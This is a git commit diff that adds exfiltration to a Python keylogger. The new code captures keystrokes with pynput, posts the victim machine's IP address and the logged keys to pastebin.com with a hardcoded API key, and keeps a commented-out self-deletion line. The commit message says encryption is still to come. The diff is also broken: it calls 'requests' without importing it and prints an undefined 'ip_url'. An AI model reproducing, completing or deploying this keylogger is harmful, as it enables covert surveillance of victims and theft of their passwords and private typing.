27b208cefbce2cd5eccec3f895827251e5f658a2
Sam <samsmith0817@gmail.com>
2020-05-02 12:41:19 -0400

    added pastebin pasting to keylogger, no encrypting yet

--- keylogger.py
+++ keylogger.py
@@ -1,6 +1,6 @@
 from pynput.keyboard import Key, Listener
 import socket
-
+from pastebin import PastebinAPI
 
 output = []
 
@@ -21,15 +21,25 @@ def key_thread():
 
 def main():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    ip = "127.0.0.1" #localhost
+    ip = "127.0.0.1"  # localhost
     port = 10101
     addr = (ip, port)
     sock.bind(addr)
-    
+
+    dev_key = '475b38cdfbba7a92d8bde6c56adfb241'
+    pastebin_url = "http://pastebin.com/api/api_post.php"
+
+    hostname = socket.gethostname()
+    ip = socket.gethostbyname(hostname)
+
+    ip_data = {'api_dev_key': dev_key,
+               'api_option': 'paste',
+               'api_paste_code': str(ip)}
+
+    key_url = requests.post(url=pastebin_url, data=ip_data)
 
     log_dir = "./"
 
-    # remove(argv[0])
     com = sock.recv(20).decode()
     print(com)
     started = False
@@ -42,15 +52,22 @@ def main():
         print(com)
 
     fi = open(log_dir + "out.txt", "w")
+    outstring = ''
     for i in output:
         b = i.replace("\'", '')
         print(b)
         fi.write(b)
+        outstring = outstring + b
     fi.close()
+
+    key_data = {'api_dev_key': dev_key,
+                'api_option': 'paste',
+                'api_paste_code': outstring}
+    key_url = requests.post(url=pastebin_url, data=key_data)
+    print(ip_url.text)
+    print(key_url.text)
+    # remove(argv[0])
 
 
 if __name__ == "__main__":
     main()
-
-
-
